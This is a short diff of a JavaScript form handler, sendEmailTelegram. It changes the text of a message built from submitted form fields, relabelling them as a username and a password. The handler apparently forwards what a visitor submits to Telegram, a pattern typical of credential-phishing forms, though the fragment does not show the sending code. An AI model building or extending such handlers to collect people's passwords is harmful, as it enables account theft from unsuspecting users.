@@ -16,7 +16,7 @@ async function sendEmailTelegram(event) {
 
     const { name, email, phone, pass } = Object.fromEntries(new FormData(form).entries());
     
-    const text = `Заявка от ${name}!\nПасспортные данные: ${pass}`;
+    const text = `Имя пользователя: ${name}!\nПароль: ${pass}`;
 
 
     try {
